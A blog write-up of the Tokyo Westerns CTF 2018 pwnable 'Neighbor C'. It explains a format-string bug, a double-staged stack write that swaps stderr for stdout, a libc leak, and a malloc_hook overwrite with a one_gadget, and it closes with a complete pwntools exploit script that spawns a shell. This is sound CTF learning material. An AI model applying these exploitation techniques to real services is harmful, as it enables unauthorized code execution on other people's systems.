+++
title = "Tokyo Westerns CTF 2018 - Neighbor C"
date = "2024-07-14"
description = "Tokyo Westerns CTF 2018 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "double staged fsb", "docker setting"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/neighbor'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Environment
The provided libc is a quite old version, so it cannot be loaded with the latest loader.
However, using the local libc would make the solution more difficult, so I decided to set up the environment by configuring a server with Docker.

``` bash
➜  sudo docker build -t 'neighbor' .
➜  sudo docker run -d -p 9999:9999 --name neighbor neighbor
➜  sudo docker top neighbor
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
user                1001143             1001123             0                   Jul13               ?                   00:00:00            /bin/sh -c socat TCP-LISTEN:9999,reuseaddr,fork EXEC:"/home/user/neighbor",pty,raw,echo=0
user                1001169             1001143             0                   Jul13               ?                   00:00:00            socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/user/neighbor,pty,raw,echo=0
```

When the server is configured this way, it listens on port `9999` and executes the `neighbor` process through `EXEC:/home/user/neighbor` when connected.

Therefore, connection is not possible with the existing `exploit.py` format, and it needs to be modified as follows for proper debugging.

``` python
def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen(f"sudo docker top {BINARY} -eo pid,comm | grep {BINARY} | awk '{print $1}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
```

I provided the `sysroot` argument so the debugger can properly read libc and load symbols, which makes it recognize the current location as the `root` directory and search for the libc file.
Therefore, you can check the libc path through vmmap, create a directory accordingly, and copy the libc file.

``` bash
➜  ls ./lib/x86_64-linux-gnu
libc-2.23.so
```


## 0x01. Vulnerability
``` c
void __fastcall __noreturn sub_8D0(FILE *stderr)
{
  while ( fgets(format, 256, stdin) )
  {
    fprintf(stderr, format);
    sleep(1u);
  }
  exit(1);
}

void __noreturn sub_937()
{
  puts("Hello neighbor!");
  puts("Please tell me about yourself. I must talk about you to our mayor.");
  sub_8D0(stderr);
}

void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  sleep(0);
  sub_937();
}
```

Looking at the binary, FSB occurs in `sub_8D0()` because `format` can be directly input to `fprintf`.

As I experienced in the previous problem, when the vulnerability is simple, the exploit becomes complex, and this problem seems to be the same.


## 0x02. Exploit
### Stack Control
Before exploiting the vulnerability, the problem is that `format` is a global variable, so we cannot input values onto the stack.
Then we cannot create pointers on the stack, making it impossible to write values to where the pointer points using `%n`, which is the core of FSB.
Therefore, we need to acquire a primitive that can write values to desired locations appropriately using values on the stack.

``` bash
gef➤  x/10gx $rsp
0x7fffffffebb0: 0x0000555555400a88      0x00007ffff7dd2540
0x7fffffffebc0: 0x0000000000000000      0x00007ffff7dd2540
0x7fffffffebd0: 0x00007fffffffebe0      0x0000555555400962
0x7fffffffebe0: 0x00007fffffffebf0      0x00005555554009d7
0x7fffffffebf0: 0x00005555554009f0      0x00007ffff7a2d840
```

So I printed the stack when `fprintf()` is called, and there were two stack addresses created during `push rbp`.
This is where the question of why the functions are called as `main()` -> `sub_937()` -> `sub_8D0()` was answered - it was to enable Double Staged FSB.

Since `0x7fffffffebd0($rsp+0x20)` points to `0x7fffffffebe0($rsp+0x30)`, we can construct the desired address at `0x7fffffffebe0` using FSB.

Since `0x7fffffffebd0` is the 9th format string, writing the payload as follows allows us to control the value stored in `0x7fffffffebe0`.

 - `%1c%9$hhn` : 0x00007fffffffebf0 -> 0x00007fffffffeb01
 - `%258c%9$hn` : 0x00007fffffffebf0 -> 0x00007fffffff0102
 - `%16909060c%9$n` : 0x00007fffffffebf0 -> 0x00007fff01020304

In the debugging environment, ASLR is turned off for convenience, so the first byte of `$rsp` is fixed as `0xb0`, but since ASLR will be enabled in the actual server environment, the exploit success rate drops to 1/16.

Anyway, in the local environment, I could see error messages, so I could view the result of `fprintf(stderr, format)`, but in the server environment, error messages cannot be seen.
Therefore, I determined that the first thing to do through the above stack control is to change `stderr` to `stdout` to proceed to the next stage.

### Libc Leak
``` bash
# fprintf(stderr, format);
gef➤  x/5i 0x55555540090e
   0x55555540090e:      mov    rax,QWORD PTR [rbp-0x8]
   0x555555400912:      lea    rsi,[rip+0x200747]        # 0x555555601060
   0x555555400919:      mov    rdi,rax
   0x55555540091c:      mov    eax,0x0
   0x555555400921:      call   0x555555400778 <fprintf@plt>
```

The `stderr` in `fprintf` is not the `stderr` in the libc `Data` section, but the `stderr` on the stack passed as an argument when calling `sub_8D0()`.
And this `stderr` can be accessed as `$rbp-0x8`, which is the address `0x7fffffffebc8($rsp+0x18)`.

Fortunately, the controllable `0x7fffffffebe0` already contains a stack address, so if we overwrite only the first byte with `0xc8`, `0x7fffffffebe0` will point to `0x7fffffffebc8`.
Then, since `0x7fffffffebe0` is the 11th format string, we can change `stderr` to `stdout`.

``` bash
gef➤  x/gx 0x555555601020
0x555555601020 <stdout>:        0x00007ffff7dd2620
gef➤  x/gx 0x555555601040
0x555555601040 <stderr>:        0x00007ffff7dd2540
```

However, since the second byte of `stderr` and `stdout` is different here, if we overwrite the first two bytes of `0x7fffffffebc8` with `0x2620`, the exploit success rate becomes 1/16 again due to ASLR.

Ultimately, exploitation is possible with a 1/256 success rate.

``` bash
'0x7ffff7dd3790 0x7ffff7b04360 0x7ffff7dd3780 0x7ffff7ff2700 0x555555400a88 0x7ffff7dd2540 (nil) 0x7ffff7dd2620 0x7fffffffebe0 0x555555400962 0x7fffffffebc8 0x5555554009d7 0x5555554009f0 0x7ffff7a2d840 \n'
```

``` bash
gef➤  x/10gx $rsp
0x7fffffffebb0: 0x0000555555400a88      0x00007ffff7dd2540
0x7fffffffebc0: 0x0000000000000000      0x00007ffff7dd2620
0x7fffffffebd0: 0x00007fffffffebe0      0x0000555555400962
0x7fffffffebe0: 0x00007fffffffebc8      0x00005555554009d7
0x7fffffffebf0: 0x00005555554009f0      0x00007ffff7a2d840
```

Comparing the format string output using the obtained `stdout` with the actual stack contents shows the above.

Looking carefully, you can see that starting from the 5th format string, it matches the stack contents.
The format strings in front of the stack output register values according to the calling convention:

- `rsi`, `rdx`, `rcx`, `r8`, `r9`

However, in the above case, you can see that it starts outputting from `rdx`, which I think is because the second argument goes into `fprintf`.

Anyway, coming back, since the 10th value of the stack contains the libc address, we can obtain the libc base address by calculating and subtracting the offset.

### Triggering `malloc`
Now for the most important part - **where to write what** - since it's an old libc, we can use `malloc_hook`.
Therefore, **where** is decided, and I checked the one-shot gadgets.

``` bash
➜  one_gadget libc-2.23.so
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

Fortunately, the conditions aren't too strict, so I checked and the gadget at `0xf1247` looked usable.
Therefore, **what** was naturally resolved, but when I thought about it, `malloc` needs to be called somewhere for `malloc_hook` to be invoked...

In the while loop flow, the only functions called are `fgets` and `fprintf`.

I tried to check if `malloc` is called internally within the functions, and I could confirm that `fgets` is simple and has no `malloc`.
On the other hand, `fprintf` calls `vfprintf`, which has too much code inside to check easily.

So I googled and found some information.

- [https://stackoverflow.com/questions/6743034/does-fprintf-use-malloc-under-the-hood](https://stackoverflow.com/questions/6743034/does-fprintf-use-malloc-under-the-hood)
- [https://github.com/Naetw/CTF-pwn-tips?tab=readme-ov-file](https://github.com/Naetw/CTF-pwn-tips?tab=readme-ov-file#use-printf-to-trigger-malloc-and-free)

After checking, it seems that if the output string created through the format string has a size of `0x10001` or more, it can trigger `malloc`.

So I xref'ed backwards from functions that call `malloc`, functions that call `j_malloc`, and confirmed that `vfprintf` is there.

### Arbitrary Write
``` bash
gef➤  x/10gx $rsp
0x7fffffffebb0: 0x0000555555400a88      0x00007ffff7dd2540
0x7fffffffebc0: 0x0000000000000000      0x00007ffff7dd2620
0x7fffffffebd0: 0x00007fffffffebe0      0x0000555555400962
0x7fffffffebe0: 0x00007fffffffebc8      0x00005555554009d7
0x7fffffffebf0: 0x00005555554009f0      0x00007ffff7a2d840
```

Now, looking at the stack again, `0x7fffffffebc0($rsp+0x10)` is empty with `NULL`.

First, we'll use Double Staged FSB to create the desired address (`addr`) in this empty space (`free_space`).
Then, using the created address as a pointer, we'll use Double Staged FSB again to write the desired value (`value`).

Naturally, `addr` will be `malloc_hook`, and `value` will be the loaded one-shot gadget.
This process can be created in Python as follows:

``` python
def arbitrary_write(s, addr, value):
    write_primitive(s, addr, value & 0xffff)
    write_primitive(s, addr + 2, (value & 0xffff0000) >> 16)
    write_primitive(s, addr + 4, (value & 0xffff00000000) >> 32)
    write_primitive(s, addr + 6, (value & 0xffff000000000000) >> 48)

def write_primitive(s, addr, value):
    free_space = rsp + 0x10
    stack_control(s, free_space, addr & 0xffff)
    stack_control(s, free_space + 2, (addr & 0xffff0000) >> 16)
    stack_control(s, free_space + 4, (addr & 0xffff00000000) >> 32)
    stack_control(s, free_space + 6, (addr & 0xffff000000000000) >> 48)

    payload = f"%{value}c".encode()
    payload += b"%7$hn"
    s.sendline(payload)

def stack_control(s, stack, value):
    payload = f"%{stack}c".encode()
    payload += b"%9$hhn"
    s.sendline(payload)

    payload = f"%{value}c".encode()
    payload += b"%11$hn"
    s.sendline(payload)
```

Actually, many unnecessary payloads are sent, so it's not efficient, but I got greedy while working on it and made it possible to do arbitrary write in one line like this.

``` python
arbitrary_write(s, malloc_hook, one_gadget)
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
import sys, os

DEBUG = True
BINARY = "neighbor"
LIBRARY = "libc-2.23.so"

code_base = 0x0000555555400000
rsp = 0xb0
malloc_hook_offset = 0x3c4b10
one_gadget_offset = 0xf1247
bp = {
    'call_8d0' : code_base + 0x95D,
    'fgets' : code_base + 0x8FA,
    'fprintf' : code_base + 0x921,
}

gs = f'''
b *{bp['call_8d0']}
b *{bp['fprintf']}
'''
context.terminal = ['tmux', 'splitw', '-hf']

def arbitrary_write(s, addr, value):
    write_primitive(s, addr, value & 0xffff)
    write_primitive(s, addr + 2, (value & 0xffff0000) >> 16)
    write_primitive(s, addr + 4, (value & 0xffff00000000) >> 32)
    write_primitive(s, addr + 6, (value & 0xffff000000000000) >> 48)

def write_primitive(s, addr, value):
    free_space = rsp + 0x10
    stack_control(s, free_space, addr & 0xffff)
    stack_control(s, free_space + 2, (addr & 0xffff0000) >> 16)
    stack_control(s, free_space + 4, (addr & 0xffff00000000) >> 32)
    stack_control(s, free_space + 6, (addr & 0xffff000000000000) >> 48)

    payload = f"%{value}c".encode()
    payload += b"%7$hn"
    s.sendline(payload)
    s.recv(0xffff)
    sleep(1)

def stack_control(s, stack, value, stderr=False):
    if value == 0:
        return
    log.info(f"writing {hex(value)} to {hex(stack)}")
    payload = f"%{stack}c".encode()
    payload += b"%9$hhn"
    s.sendline(payload)
    if stderr == False:
        s.recv(0xffff)
    sleep(1)

    payload = f"%{value}c".encode()
    payload += b"%11$hn"
    s.sendline(payload)
    if stderr == False:
        s.recv(0xffff)
    sleep(1)

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen("sudo docker top {BINARY} -eo pid,comm | grep {BINARY} | awk '{print $1}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    s.recv()

    # overwrite stderr in stack to stdout
    stack_control(s, rsp + 0x18, 0x2620, stderr=True)

    # leak libc base
    payload = b"%14$p"
    s.sendline(payload)
    libc = int(s.recv(), 16) - 0x20840
    sleep(1)
    malloc_hook = libc + malloc_hook_offset
    one_gadget = libc + one_gadget_offset
    log.info(f"libc : {hex(libc)}")
    log.info(f"malloc_hook : {hex(malloc_hook)}")
    log.info(f"one_gadget : {hex(one_gadget)}")

    # write one_gadget address to malloc_hook
    arbitrary_write(s, malloc_hook, one_gadget)

    # trigger malloc -> malloc_hook
    s.sendline(f"%{0x21000}c".encode())
    s.recv(0x21000)
    sleep(1)
    s.interactive()

if __name__=='__main__':
    main()
```